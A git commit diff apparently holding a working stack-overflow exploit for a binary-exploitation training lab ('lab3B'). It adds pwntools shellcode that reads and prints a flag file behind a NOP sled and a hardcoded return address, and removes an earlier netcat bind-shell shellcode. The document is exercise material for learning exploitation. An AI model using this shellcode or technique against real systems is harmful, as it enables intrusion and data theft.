aa0561736227e1c22a4d7a0bc7e40f75b197586d
Kamil Frankowicz <fumfi.255@gmail.com>
2017-01-16 11:25:10 +0100

    Working exploit for lab3B

--- lab3b.py
+++ lab3b.py
@@ -1,55 +1,50 @@
-#  https://docs.pwntools.com/en/stable/
 from pwn import *
-context(arch = 'i386', os = 'linux')
 import binascii
+import struct
 
-# "A" * 156 + \x70\xf6\xff\xbf + NOP * 112 + SH
+context(arch ='i386', os ='linux')
 
-netcat_sh = "\x31\xc0\x50\x68\x33\x33\x33\x37\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
-
-# print len(netcat_sh)
-#
-# sh1 = "6873737764682f2f7061682f657463"
-#
-#
-
-# path = "push 0x737361702e",
-#     "push 0x2f413362",
-#     "push 0x616c2f65",
-#     "push 0x6d6f682f","
-
-# #print asm('push 0x737361702e', arch = 'i386', os = 'linux')
-# print asm("push 0x73")
-
-# sh1 = "52737377642f2f70612f657463"
-# print binascii.unhexlify(sh1)[::-1]
-
-inst = [
-    "xor eax, eax",
-    "mov eax, edx",
-    "push edx",
-    "push 0x7461632f",
-    "push 0x6e69622",
-    "mov ebx, esp",
-    "push edx",
+inst= [
+    "xor ecx, ecx",
     "push 0x73",
-    "push 0x7361702e",
-    "push 0x2f413362",
-    "push 0x616c2f65",
-    "push 0x6d6f682f",
+    "push 0x7361702e", # [!] <--- Flag file path
+    "push 0x2f413362", # [!] <--- Flag file path
+    "push 0x616c2f65", # [!] <--- Flag file path
+    "push 0x6d6f682f", # [!] <--- Flag file path
+    "mov ebx, esp",
+    "xor eax, eax",
+    "mov al, SYS_open",
+    "int 0x80",
+
+    "mov ebx, eax",
+    "xor eax, eax",
+    "mov al, SYS_read", # [!] <--- Read from file
     "mov ecx, esp",
-    "mov 0xB, al",
-    "push edx",
-    "push ecx",
-    "push ebx",
+    "xor edx, edx",
+    "mov dl, 0x20",
+    "int 0x80",
+
+    "xor eax, eax",
+    "mov al, SYS_write", # [!] <--- Write to stdout
+    "mov bl, 1",
     "mov ecx, esp",
-    "int 80h"
+    "int 0x80",
+
+    "xor eax, eax",
+    "push 0xb7e3ca83", # [!] <--- Return to main()
+    "ret" # [!] <--- Return to main()
 ]
 
 sh = ''
 
 for instr in inst:
-    print instr
     sh += asm(instr)
 
-print binascii.hexlify(sh)
+shellcode_bytes = binascii.unhexlify(sh.encode('hex'))
+
+# "A" * 156 + \x70\xf6\xff\xbf [RA] + NOP * 300 + Shellcode
+full_payload = "A" * 156 + struct.pack('<I', 0xBFFFF6D4) + '\x90' * 300 + shellcode_bytes
+
+# cat /tmp/input | ./lab3B
+with open('/tmp/input', 'wb') as fp:
+    fp.write(full_payload)
